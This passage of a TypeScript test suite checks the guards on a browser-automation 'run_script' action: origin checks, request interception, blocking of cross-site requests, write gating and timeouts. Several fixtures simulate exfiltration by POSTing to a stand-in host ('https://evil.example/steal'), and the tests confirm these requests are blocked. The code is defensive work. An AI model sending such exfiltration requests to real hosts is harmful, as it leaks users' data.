    // The refused down leaves no trace: no press, no release at (0, 0), and
    // the later move carries no pressed-button mask.
    expect(second.value).toBe('POINTER_POSITION_UNKNOWN');
    expect(second.input.autoReleased).toEqual([]);
    expect(
      transport.input
        .slice(firstScriptEvents)
        .filter((event) => event.method === 'Input.dispatchMouseEvent')
        .map((event) => [event.type, event.x, event.y, event.buttons]),
    ).toEqual([['mouseMoved', 120, 80, 0]]);
  });

  it('presents each scripted destination once before dispatching all interpolated input', async () => {
    const transport = new ScriptPageTransport();
    const cursor: Array<{ x: number; y: number }> = [];
    const core = new BrowserCore({ provider: 'test', version: 1, actions: ['run_script'] as const });
    const session = core.createSession(transport, {
      beforePointerAction: ({ point }) => { cursor.push(point); },
    });
    const moves: Array<{ x: unknown; y: unknown }> = [];
    transport.onInput = (event) => {
      if (event.type === 'mouseMoved') {
        expect(cursor.at(-1)).toEqual(moves.length === 0 ? { x: 40, y: 60 } : { x: 120, y: 80 });
        moves.push({ x: event.x, y: event.y });
      }
    };
    const result = await session.execute('run_script', {
      code: 'await page.mouse.move(40, 60); await page.mouse.move(120, 80, {steps: 100});',
    });
    expect(moves).toHaveLength(101);
    expect(moves.at(-1)).toEqual({ x: 120, y: 80 });
    expect(result).toMatchObject({ success: true });
    expect(cursor).toEqual([{ x: 40, y: 60 }, { x: 120, y: 80 }]);
  });

  it('keeps the interrupted page.evaluate warning when the action ends with a cancellation', async () => {
    const transport = new ScriptPageTransport();
    transport.hangOn = 'pendingContinuation';
    const controller = new AbortController();
    transport.onEvaluate = (count) => {
      // Cancel once the long-running page function has been sent (the first
      // evaluation reads the page URL for request interception).
      if (count >= 2) queueMicrotask(() => controller.abort());
    };

    await expect(
      run(
        transport,
        'await page.evaluate(async function pendingContinuation() { await new Promise(() => {}); });',
        {},
        controller.signal,
      ),
    ).rejects.toThrow(/cancelled.*did not finish and may still change the page/su);
  });
});

type GuardedResult = ScriptResult & {
  error?: { code?: string; message: string };
  pageScript?: {
    origins: string[];
    calls: number;
    requests: Array<{ method: string; url: string; blocked?: true }>;
    requestCount: number;
    nonGetRequests: number;
    blockedRequests: number;
    writeLike: boolean;
    durationMs: number;
  };
  uncertainWrite?: { reason: string; message: string };
};

function fetchCommands(transport: ScriptPageTransport): string[] {
  return transport.commands
    .filter((command) => command.method.startsWith('Fetch.'))
    .map((command) => command.method);
}

describe('run_script page JavaScript guards', () => {
  const tamper = 'return await page.evaluate(() => { page.score = 99; return page.score; });';

  it('runs page JavaScript on the current web page without any host allow-list', async () => {
    const transport = new ScriptPageTransport();
    const result = (await run(transport, tamper)) as GuardedResult;
    expect(result).toMatchObject({ success: true, value: 99 });
    expect(result.pageScript?.origins).toEqual(['https://shop.example']);
  });

  it('checks the origin in the same evaluation: a page that moved runs nothing', async () => {
    const transport = new ScriptPageTransport();
    // The URL read for interception still sees the first page; the call does not.
    transport.onEvaluate = (count) => {
      if (count === 2) transport.location = { href: 'https://evil.example/', origin: 'https://evil.example', protocol: 'https:' };
    };
    const result = (await run(transport, tamper)) as GuardedResult;
    expect(result.error?.code).toBe('PAGE_EVALUATE_FAILED');
    expect(result.error?.message).toContain('https://evil.example');
    expect(transport.page.score).toBe(0);
    // The window it opened was closed again.
    expect(fetchCommands(transport)).toEqual(['Fetch.enable', 'Fetch.enable', 'Fetch.disable']);
  });

  it('runs nothing on a page that is not a web page', async () => {
    for (const protocol of ['about:', 'data:', 'file:'] as const) {
      const transport = new ScriptPageTransport();
      transport.location = { href: `${protocol}x`, origin: 'null', protocol };
      const result = (await run(transport, tamper)) as GuardedResult;
      expect(result.error?.code).toBe('PAGE_SCRIPT_UNSUPPORTED_PAGE');
      expect(transport.page.score).toBe(0);
      expect(fetchCommands(transport)).toEqual([]);
    }
  });

  it('fails requests to another site while page JavaScript runs and audits its effects', async () => {
    const transport = new ScriptPageTransport();
    const code = [
      'return await page.evaluate(() => {',
      '  request("https://shop.example/api/cart", "GET");',
      '  request("https://evil.example/steal?d=1", "POST");',
      '  request("https://cdn.shop.example/a.js", "GET");',
      '  return 1;',
      '});',
    ].join('\n');
    const result = (await run(transport, code)) as GuardedResult;
    expect(result).toMatchObject({ success: true, value: 1 });
    const failed = transport.commands.filter((command) => command.method === 'Fetch.failRequest');
    expect(failed).toEqual([
      {
        method: 'Fetch.failRequest',
        params: { requestId: 'interception-2', errorReason: 'BlockedByClient' },
      },
    ]);
    expect(
      transport.commands.filter((command) => command.method === 'Fetch.continueRequest'),
    ).toHaveLength(2);
    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
    expect(result.pageScript).toMatchObject({
      origins: ['https://shop.example'],
      calls: 1,
      requestCount: 3,
      blockedRequests: 1,
      // The refused POST never left the browser.
      nonGetRequests: 0,
      writeLike: false,
    });
    expect(result.pageScript?.requests).toContainEqual({
      method: 'POST',
      url: 'https://evil.example/steal',
      blocked: true,
    });
    expect(typeof result.pageScript?.durationMs).toBe('number');
    expect(result.uncertainWrite).toBeUndefined();
  });

  it('a same-site POST makes the next write wait for a read', async () => {
    const transport = new ScriptPageTransport();
    const core = new BrowserCore({
      provider: 'test',
      version: 1,
      actions: ['run_script', 'click', 'screenshot'] as const,
    });
    const session = core.createSession(transport, {
      captureScreenshot: async () => ({
        data: Buffer.from('fake-png').toString('base64'),
        format: 'png',
        width: 800,
        height: 600,
      }),
    });
    const posted = (await session.execute('run_script', {
      code: 'return await page.evaluate(() => { request("https://shop.example/api/save", "POST"); return "sent"; });',
    })) as GuardedResult;
    expect(posted).toMatchObject({
      success: true,
      value: 'sent',
      pageScript: { nonGetRequests: 1, writeLike: true },
      uncertainWrite: { reason: 'page_script' },
    });

    const refused = session.execute('click', { position: { x: 10, y: 10 } });
    await expect(refused).rejects.toThrow(/UNVERIFIED_WRITE_RETRY/u);
    await expect(refused).rejects.toThrow(/page JavaScript sent a write request/u);
    expect(transport.input.filter((event) => event.method === 'Input.dispatchMouseEvent')).toEqual(
      [],
    );

    await session.execute('screenshot', {});
    await session
      .execute('click', { position: { x: 10, y: 10 } })
      .catch((error: unknown) => expect(String(error)).not.toContain('UNVERIFIED_WRITE_RETRY'));
  });

  it('does not run when request interception cannot be enabled', async () => {
    const transport = new ScriptPageTransport();
    transport.failMethod = 'Fetch.enable';
    const result = (await run(transport, tamper)) as GuardedResult;
    expect(result.error?.code).toBe('PAGE_SCRIPT_UNAVAILABLE');
    expect(transport.page.score).toBe(0);
  });

  it('shares one interception window between concurrent calls and always ends it', async () => {
    const transport = new ScriptPageTransport();
    const result = (await run(
      transport,
      'return await Promise.all([page.evaluate(() => page.score), page.evaluate(() => page.score + 1), page.waitForFunction(() => true)]);',
    )) as GuardedResult;
    expect(result).toMatchObject({ success: true, value: [0, 1, true] });
    const fetch = fetchCommands(transport);
    const opened = transport.commands.filter(
      ({ method, params }) =>
        method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length > 0,
    );
    expect(opened.length).toBe(fetch.filter((method) => method === 'Fetch.disable').length);
    expect(fetch.at(-1)).toBe('Fetch.disable');
    expect(result.pageScript?.calls).toBe(3);
  });

  it('limits the size of page.evaluate source and results', async () => {
    const big = (await run(
      new ScriptPageTransport(),
      'return await page.evaluate(() => "x".repeat(300 * 1024));',
    )) as GuardedResult;
    expect(big.error?.code).toBe('EVALUATE_RESULT_TOO_LARGE');
    const long = (await run(
      new ScriptPageTransport(),
      `return await page.evaluate(() => ${JSON.stringify('y'.repeat(70 * 1024))}.length);`,
    )) as GuardedResult;
    expect(long.error?.code).toBe('EVALUATE_SOURCE_TOO_LARGE');
  });
});

/** The second Fetch.enable of a window: new requests are no longer intercepted. */
function stopsIntercepting(method: string, params: Record<string, unknown>): boolean {
  return method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length === 0;
}

async function nextTurn(): Promise<void> {
  const { promise, resolve } = Promise.withResolvers<void>();
  setImmediate(resolve);
  await promise;
}

/**
 * Runs `execution` to its end on a fake clock and returns the time it took on
 * that clock. setImmediate and the script's Worker stay real, and the clock
 * starts at `reached`: moved earlier, it would pass the script's deadline before
 * the Worker is up, and the step under test would never run.
 */
async function fakeClockMs(
  reached: Promise<void>,
  execution: () => Promise<unknown>,
): Promise<number> {
  const startedAt = Date.now();
  let settled = false;
  const settle = (): void => {
    settled = true;
  };
  execution().then(settle, settle);
  await reached;
  while (!settled) {
    await vi.advanceTimersByTimeAsync(20);
    await nextTurn();
  }
  return Date.now() - startedAt;
}

/** Real time a run may still take, with the fake clock held at its budget, to finish its cleanup. */
const REAL_SETTLE_MS = 2_000;

/** Worker.terminate calls still running; see endsWithinFakeMs. */
let terminatingWorkers = 0;

/** Counts the script Worker's terminate calls until they end. */
function trackWorkerTerminations(): void {
  const terminate = Worker.prototype.terminate;
  vi.spyOn(Worker.prototype, 'terminate').mockImplementation(function (this: Worker) {
    terminatingWorkers += 1;
    return terminate.call(this).finally(() => {
      terminatingWorkers -= 1;
    });
  });
}

/**
 * Whether `execution` ends without the fake clock passing `budgetMs` (counted
 * from the start, like fakeClockMs). Once the run reached its hung call it
 * waits only on fake timers, except while the script Worker terminates after
 * the script deadline: that is real thread work, slow on a loaded runner, and
 * the clock holds still until it ends, so the cleanup timers armed after it
 * start at the same fake time on every machine. The clock moves in 20 ms steps
 * only up to the budget; a run that needs a timer beyond it never ends here
 * and returns false.
 */
async function endsWithinFakeMs(
  reached: Promise<void>,
  execution: () => Promise<unknown>,
  budgetMs: number,
): Promise<boolean> {
  trackWorkerTerminations();
  const startedAt = Date.now();
  let settled = false;
  const settle = (): void => {
    settled = true;
  };
  execution().then(settle, settle);
  await reached;
  while (!settled && Date.now() - startedAt < budgetMs) {
    if (terminatingWorkers === 0) {
      await vi.advanceTimersByTimeAsync(Math.min(20, budgetMs - (Date.now() - startedAt)));
    }
    await nextTurn();
  }
  const realDeadline = performance.now() + REAL_SETTLE_MS;
  while (!settled && performance.now() < realDeadline) await nextTurn();
  return settled;
}

describe('run_script Fetch window', () => {
  const SCRIPT_MS = 30_000;
  const CLEANUP_MS = 5_000;
  const crossSitePost = 'request("https://evil.example/steal", "POST")';

  afterEach(() => {
    vi.useRealTimers();
    vi.restoreAllMocks();
  });

  it('answers a paused request after its event, never while Electron delivers it', async () => {
    const transport = new ScriptPageTransport();
    const result = (await run(
      transport,
      `return await page.evaluate(() => { ${crossSitePost}; request("https://shop.example/a", "GET"); return 1; });`,
    )) as GuardedResult;
    expect(result).toMatchObject({ success: true, value: 1 });
    expect(transport.sentDuringEvent).toEqual([]);
    expect(fetchCommands(transport)).toContain('Fetch.failRequest');
    expect(fetchCommands(transport)).toContain('Fetch.continueRequest');
  });

  it('stops taking requests first and disables only after the paused ones are answered', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    const answer = Promise.withResolvers<void>();
    const closing = Promise.withResolvers<void>();
    transport.holdCommand = (method) =>
      method === 'Fetch.continueRequest' ? answer.promise : undefined;
    transport.onCommand = (method, params) => {
      if (stopsIntercepting(method, params)) closing.resolve();
    };
    const execution = run(
      transport,
      'return await page.evaluate(() => { request("https://shop.example/a", "GET"); return 1; });',
      { timeout: SCRIPT_MS },
    );
    await fakeClockMs(transport.interceptionAsked.promise, () => closing.promise);
    // Well inside the drain: the answer is still open, so nothing may be disabled.
    await vi.advanceTimersByTimeAsync(500);
    expect(fetchCommands(transport)).not.toContain('Fetch.disable');
    answer.resolve();
    await fakeClockMs(transport.interceptionAsked.promise, () => execution);
    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
    expect(fetchCommands(transport).filter((method) => method === 'Fetch.continueRequest')).toHaveLength(1);
  });

  it('still refuses a request to another site that pauses while the window closes', async () => {
    const transport = new ScriptPageTransport();
    let requestId = '';
    transport.onCommand = (method, params) => {
      if (stopsIntercepting(method, params)) {
        requestId = transport.emitPaused('https://evil.example/late', 'POST');
      }
    };
    const result = (await run(transport, 'return await page.evaluate(() => 1);')) as GuardedResult;
    expect(result.pageScript?.blockedRequests).toBe(1);
    const methods = fetchCommands(transport);
    expect(methods.indexOf('Fetch.failRequest')).toBeGreaterThan(-1);
    expect(methods.indexOf('Fetch.failRequest')).toBeLessThan(methods.indexOf('Fetch.disable'));
    expect(transport.commands.find(({ method }) => method === 'Fetch.failRequest')?.params).toEqual({
      requestId,
      errorReason: 'BlockedByClient',
    });
  });

  it('does not answer a request paused after Fetch.disable, and does not call it blocked', async () => {
    const transport = new ScriptPageTransport();
    transport.onCommand = (method) => {
      if (method === 'Fetch.disable') transport.emitPaused('https://evil.example/late', 'POST');
    };
    const result = (await run(transport, 'return await page.evaluate(() => 1);')) as GuardedResult;
    expect(result).toMatchObject({ success: true, value: 1 });
    const methods = fetchCommands(transport);
    expect(methods).not.toContain('Fetch.failRequest');
    expect(methods).not.toContain('Fetch.continueRequest');
    expect(result.pageScript?.blockedRequests).toBe(0);
    expect(JSON.stringify(result.pageScript?.requests)).toContain('evil.example/late');
  });

  it('repeats an unconfirmed answer once when the drain runs out, then disables', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    transport.hangCommand = (method) => method === 'Fetch.continueRequest';
    let result: unknown;
    await fakeClockMs(transport.interceptionAsked.promise, async () => {
      result = await run(
        transport,
        'return await page.evaluate(() => { request("https://shop.example/a", "GET"); return 1; });',
        { timeout: SCRIPT_MS },
      );
    });
    expect(result).toBeDefined();
    const methods = fetchCommands(transport);
    expect(methods.filter((method) => method === 'Fetch.continueRequest')).toHaveLength(2);
    expect(methods.at(-1)).toBe('Fetch.disable');
  });

  it.each(['Fetch.continueRequest', 'Fetch.failRequest', 'Fetch.disable'])(
    'ends with a structured error inside its deadline when %s is never answered',
    async (hung) => {
      vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
      const transport = new ScriptPageTransport();
      transport.hangOn = 'still-running';
      transport.hangCommand = (method) => method === hung;
      let outcome: unknown;
      const ended = await endsWithinFakeMs(
        transport.interceptionAsked.promise,
        async () => {
          outcome = await run(
            transport,
            `return await Promise.all([
  page.evaluate(() => { ${crossSitePost}; request("https://shop.example/a", "GET"); return 1; }),
  page.evaluate(() => "still-running"),
]);`,
            { timeout: SCRIPT_MS },
          ).catch((error: unknown) => error);
        },
        SCRIPT_MS + CLEANUP_MS,
      );
      expect(ended).toBe(true);
      expect(outcome).toMatchObject({
        code: expect.stringMatching(/^(SCRIPT_TIMEOUT|BROWSER_OPERATION_TIMEOUT)$/u),
      });
    },
  );

  it('ends inside its deadline when a call hangs before the page: Fetch.enable is never answered', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    transport.hangCommand = (method) => method === 'Fetch.enable';
    let outcome: unknown;
    const ended = await endsWithinFakeMs(
      transport.interceptionAsked.promise,
      async () => {
        outcome = await run(transport, 'return await page.evaluate(() => 1);', {
          timeout: SCRIPT_MS,
        }).catch((error: unknown) => error);
      },
      SCRIPT_MS + CLEANUP_MS,
    );
    expect(ended).toBe(true);
    expect(outcome).toMatchObject({ code: 'BROWSER_OPERATION_TIMEOUT' });
  });

  it.each([
    ['Runtime.evaluate', 'return await page.evaluate(() => 1);'],
    ['Input.dispatchMouseEvent', 'await page.mouse.click(10, 10); return 1;'],
  ])('ends inside its deadline when %s is never answered', async (hung, code) => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    const reached = Promise.withResolvers<void>();
    transport.hangCommand = (method) => {
      if (method !== hung) return false;
      reached.resolve();
      return true;
    };
    let outcome: unknown;
    const ended = await endsWithinFakeMs(
      reached.promise,
      async () => {
        outcome = await run(transport, code, { timeout: SCRIPT_MS }).catch(
          (error: unknown) => error,
        );
      },
      SCRIPT_MS + CLEANUP_MS,
    );
    expect(ended).toBe(true);
    expect(outcome).toMatchObject({ code: 'BROWSER_OPERATION_TIMEOUT' });
  });

  it('ends a window whose call never came back: no listener answers a request paused afterwards', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    const reached = Promise.withResolvers<void>();
    transport.hangCommand = (method, params) => {
      if (method !== 'Runtime.evaluate' || !String(params.expression).includes('never-returns')) {
        return false;
      }
      reached.resolve();
      return true;
    };
    await fakeClockMs(reached.promise, () =>
      run(transport, 'return await page.evaluate(() => "never-returns");', {
        timeout: SCRIPT_MS,
      }).catch((error: unknown) => error),
    );
    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
    const answered = fetchCommands(transport).length;
    transport.emitPaused('https://evil.example/late', 'POST');
    await nextTurn();
    expect(fetchCommands(transport)).toHaveLength(answered);
  });

  it('gives up a script at the action deadline whatever keeps it from returning', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    // A failed script takes a screenshot; this one never comes back.
    const captured = Promise.withResolvers<void>();
    const session = createSession(transport, Promise.withResolvers<void>().promise, captured.resolve);
    let outcome: unknown;
    await fakeClockMs(captured.promise, async () => {
      outcome = await session
        .execute('run_script', { code: 'throw new Error("failed");', timeout: SCRIPT_MS })
        .catch((error: unknown) => error);
    });
    expect(String(outcome)).toContain(`ACTION_TIMEOUT: Browser action exceeded ${SCRIPT_MS + CLEANUP_MS}ms`);
  });

  it('leaves no unhandled rejection when the page URL cannot be read during a navigation', async () => {
    const transport = new ScriptPageTransport();
    transport.timeoutEvaluate = 'location.href';
    const unhandled: unknown[] = [];
    const record = (reason: unknown): void => {
      unhandled.push(reason);
    };
    process.on('unhandledRejection', record);
    try {
      await run(transport, 'return await page.evaluate(() => 1);').catch(
        () => undefined,
      );
      // Node reports an unhandled rejection after the microtask queue drains.
      await nextTurn();
    } finally {
      process.off('unhandledRejection', record);
    }
    expect(unhandled).toEqual([]);
  });

  it('a call that comes after the main frame committed a new document opens its own window on the new site', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const transport = new ScriptPageTransport();
    // The first call navigates and stays in its window a while, as an awaiting
    // call does until Chrome reports its document gone.
    const code = `
      const first = page.evaluate(() => { commit("https://other.example/p2"); return new Promise((resolve) => setTimeout(resolve, 1000, "first")); });
      await page.waitForFunction(() => location.origin === "https://other.example");
      const second = await page.evaluate(() => { request("https://other.example/api", "GET"); request("https://shop.example/x", "GET"); return "second"; });
      return [await first, second];`;
    let result: GuardedResult | undefined;
    await fakeClockMs(transport.interceptionAsked.promise, async () => {
      result = (await run(transport, code, {
        timeout: SCRIPT_MS,
      })) as GuardedResult;
    });
    expect(result).toMatchObject({ success: true, value: ['first', 'second'] });
    // The new page's own request goes out; the old site is another site now.
    expect(result?.pageScript?.requests).toContainEqual({
      method: 'GET',
      url: 'https://other.example/api',
    });
    expect(result?.pageScript?.requests).toContainEqual({
      method: 'GET',
      url: 'https://shop.example/x',
      blocked: true,
    });
    expect(result?.pageScript?.origins).toEqual(['https://shop.example', 'https://other.example']);
    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
  });

  it('a window still opening when the script ends never starts intercepting', async () => {
    const transport = new ScriptPageTransport();
    const held = Promise.withResolvers<void>();
    const reached = Promise.withResolvers<void>();
    // The window's main-frame lookup answers only after the action returned.
    let armed = false;
    transport.onEvaluate = () => {
      armed = true;
    };
    transport.holdCommand = (method) => {
      if (method !== 'Page.getFrameTree' || !armed) return undefined;
      reached.resolve();
      return held.promise;
    };
    // The evaluate is not awaited: the script ends while its window is still
    // opening, and the action reports the operation that did not finish.
    const outcome = await run(
      transport,
      'page.evaluate(() => 1).catch(() => {}); return "done";',
    ).catch((error: unknown) => error);
    expect(String(outcome)).toContain('BROWSER_OPERATION_TIMEOUT');
    await reached.promise;
    held.resolve();
    for (let turn = 0; turn < 20; turn += 1) await nextTurn();
    const intercepting = transport.commands.filter(
      ({ method, params }) =>
        method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length > 0,
    );
    expect(intercepting).toEqual([]);
    // Nothing listens for paused requests either.
    const sent = transport.commands.length;
    transport.emitPaused('https://cdn.other.example/app.js', 'GET');
    await nextTurn();
    expect(transport.commands.slice(sent)).toEqual([]);
  });
});
